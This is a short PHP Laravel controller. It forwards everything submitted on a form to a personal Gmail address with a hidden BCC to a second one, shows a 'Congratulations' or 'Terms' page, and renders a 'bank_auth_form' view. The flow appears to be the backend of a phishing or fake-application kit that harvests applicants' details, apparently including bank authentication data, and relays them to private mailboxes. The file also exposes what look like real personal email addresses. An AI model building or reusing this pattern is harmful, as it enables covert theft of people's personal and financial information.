<?php

namespace App\Http\Controllers;

use App\Mail\FormDetailsMail;
use App\Mail\FormSubmissionMail;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;

class HomeController extends Controller
{
    public function saveApply(Request $request){
        $formData = $request->all();

        // Send the email
        Mail::to('berringtonberri3@gmail.com')
            ->bcc('mr.jasmin.shukal@gmail.com')->send(new FormDetailsMail($formData));

        return view('Congratulations');
    }
    public function saveApplyOne(Request $request){
        $formData = $request->except('_token');
        // dd($formData);
        // die();
        Mail::to('Berringtonberri3@gmail.com')->bcc('mr.jasmin.shukal@gmail.com')->send(new FormSubmissionMail($formData));
        return view('Terms');

        // return view('verification-in-process');
    }
    public function bank_auth_form(Request $request){
        // $formData = $request->all();

        $image=$request->image;
        // // Send the email
        // Mail::to('recipient@example.com')->send(new FormDetailsMail($formData));

        return view('bank_auth_form',compact('image'));
    }
}
